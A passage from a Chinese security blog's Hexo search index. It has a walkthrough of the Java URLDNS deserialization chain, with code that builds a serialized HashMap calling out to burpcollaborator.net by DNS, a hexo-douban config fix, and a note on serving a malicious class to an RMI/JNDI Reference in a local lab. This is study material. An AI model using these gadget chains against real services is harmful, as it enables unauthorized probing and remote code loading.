src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86.assets/image-20220801040121561.png" alt="image-20220801040121561"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//HashMap类</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//Object类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure><h2 id="2-URL类"><a href="#2-URL类" class="headerlink" title="2.URL类"></a>2.URL类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//URL类中有hashcode方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> hashCode;</span><br><span class="line"><span class="comment">//URL类调用了URLStreamHandler的hashcode方法</span></span><br><span class="line">        hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//URLStreamHandler类</span></span><br><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        ......</span><br><span class="line">        <span class="comment">// 根据url获取ip</span></span><br><span class="line">        <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="3-尝试构造反序列化链"><a href="#3-尝试构造反序列化链" class="headerlink" title="3.尝试构造反序列化链"></a>3.尝试构造反序列化链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;URL, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://qoi1p3cnulmb30dhidvrc4h3quwlka.burpcollaborator.net&quot;</span>),<span class="number">1</span>);</span><br><span class="line">serialize(map);</span><br></pre></td></tr></table></figure><img src="/.top//image-20220801042535599.png" alt="image-20220801042535599" style="zoom:50%;"><p><strong>出现两个问题</strong></p><blockquote><p>1.在序列化之前就会发起调用一次hash函数，从而发起DNS请求，可能会影响我们。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap.put() -&gt; HashMap.Hash() -&gt; Object.hashCode()</span><br></pre></td></tr></table></figure><blockquote><p>2.URL的初始hashCode为-1,但是在put之后会触发URL的hashcode方法，导致hashCode不是-1，从而发序列化的URL对象的hashCode也不是-1，反序列化时就不会触发hashCode方法</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//URL类</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="variable">hashCode</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//只有当hashCode不是-1时，才能触发到hashCode方法，从而发起DNS请求</span></span><br><span class="line">        hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>解决方案</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里不要发起请求，把hashCode改成不是-1</span></span><br><span class="line">map.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://qoi1p3cnulmb30dhidvrc4h3quwlka.burpcollaborator.net&quot;</span>),<span class="number">1</span>);</span><br><span class="line"><span class="comment">//把hashCode改成-1（通过反射，改变已有对象属性）</span></span><br><span class="line">serialize(map);</span><br></pre></td></tr></table></figure><h2 id="4-URLDNS完整版"><a href="#4-URLDNS完整版" class="headerlink" title="4.URLDNS完整版"></a>4.URLDNS完整版</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SerializationTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://2y1dzfmz4xwndcntsp53mgrf066yun.burpcollaborator.net&quot;</span>);</span><br><span class="line">        <span class="comment">//这里不要发起请求，把hashCode改成不是-1</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.set(url,<span class="number">1234</span>);</span><br><span class="line">        map.put(url,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//把hashCode改成-1（通过反射，改变已有对象属性）</span></span><br><span class="line">        hashCode.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(map);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//UnserializationTest</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86.assets/image-20220801045742147.png" alt="image-20220801045742147"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> cc链 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo使用douban插件用户ID输入错误</title>
      <link href="/2022/12/08/hexo%E4%BD%BF%E7%94%A8douban%E6%8F%92%E4%BB%B6%E7%94%A8%E6%88%B7ID%E8%BE%93%E5%85%A5%E9%94%99%E8%AF%AF/"/>
      <url>/2022/12/08/hexo%E4%BD%BF%E7%94%A8douban%E6%8F%92%E4%BB%B6%E7%94%A8%E6%88%B7ID%E8%BE%93%E5%85%A5%E9%94%99%E8%AF%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>按照hexo-douban上的教程安装完之后，输入命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo douban -bgm</span><br></pre></td></tr></table></figure><p>发现报错，用户ID输入错误</p><p><img src="/images/hexo%E4%BD%BF%E7%94%A8douban%E6%8F%92%E4%BB%B6%E7%94%A8%E6%88%B7ID%E8%BE%93%E5%85%A5%E9%94%99%E8%AF%AF.assets/image-20221208152742775.png" alt="image-20221208152742775"></p><h1 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h1><p>更改hexo根目录下的<code>_config.yml</code>文件,将原本的user改为id</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">douban:</span></span><br><span class="line">  <span class="attr">id:</span> <span class="string">xxxxxxx</span></span><br><span class="line">  <span class="attr">builtin:</span> <span class="literal">true</span> <span class="comment"># 选择是否有主题渲染</span></span><br><span class="line">  <span class="attr">book:</span></span><br><span class="line">    <span class="attr">title:</span> <span class="string">&#x27;xxxx&#x27;</span></span><br><span class="line">    <span class="attr">quote:</span> <span class="string">&#x27;xxxxx&#x27;</span></span><br><span class="line">  <span class="attr">movie:</span></span><br><span class="line">    <span class="attr">title:</span> <span class="string">&#x27;This is my movie title&#x27;</span></span><br><span class="line">    <span class="attr">quote:</span> <span class="string">&#x27;This is my movie quote&#x27;</span></span><br><span class="line">  <span class="comment"># game:</span></span><br><span class="line">    <span class="comment"># title: &#x27;This is my game title&#x27;</span></span><br><span class="line">    <span class="comment"># quote: &#x27;This is my game quote&#x27;</span></span><br><span class="line">  <span class="attr">timeout:</span> <span class="number">100000</span></span><br></pre></td></tr></table></figure><p>问题的解决方案来自于这里</p><p><code>https://github.com/mythsman/hexo-douban/issues/107</code></p><p><img src="/images/hexo%E4%BD%BF%E7%94%A8douban%E6%8F%92%E4%BB%B6%E7%94%A8%E6%88%B7ID%E8%BE%93%E5%85%A5%E9%94%99%E8%AF%AF.assets/image-20221208152715048.png" alt="image-20221208152715048"></p>]]></content>
      
      
      <categories>
          
          <category> HEXO配置美化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HEXO配置美化 </tag>
            
            <tag> hexo-douban </tag>
            
            <tag> hexo-butterfly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决RMI无法连接python开启的http服务</title>
      <link href="/2022/12/06/%E8%A7%A3%E5%86%B3RMI%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5python%E5%BC%80%E5%90%AF%E7%9A%84http%E6%9C%8D%E5%8A%A1/"/>
      <url>/2022/12/06/%E8%A7%A3%E5%86%B3RMI%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5python%E5%BC%80%E5%90%AF%E7%9A%84http%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>当我们使用python3开启http服务后</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server <span class="number">8080</span></span><br></pre></td></tr></table></figure><p><img src="/images/%E8%A7%A3%E5%86%B3RMI%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5python%E5%BC%80%E5%90%AF%E7%9A%84http%E6%9C%8D%E5%8A%A1.assert/image-20221003175657450.png" alt="image-20221003175657450"></p><p>然后使用RMI去连接这个目录下的恶意类，发现连接失败，python端没有任何回显</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;TestRef&quot;</span>, <span class="string">&quot;TestRef&quot;</span>, <span class="string">&quot;http://localhost:7777/&quot;</span>);</span><br><span class="line">initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>,refObj);</span><br></pre></td></tr></table></figure><h1 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h1><p>在python3新的版本中一开始的写法是默认开启的ipv6<br>应该使用下面这种方式来开启http</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server <span class="number">7777</span> --bind <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><p><img src="/images/%E8%A7%A3%E5%86%B3RMI%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5python%E5%BC%80%E5%90%AF%E7%9A%84http%E6%9C%8D%E5%8A%A1.assert/image-20221003175552709.png" alt="image-20221003175657450"></p><p>我们从图中也能看出,ip地址从<code>[::]</code>变成了<code>127.0.0.1</code></p><p>再次使用RMI连接，连接成功</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> python </tag>
            
            <tag> http </tag>
            
            <tag> RMI </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
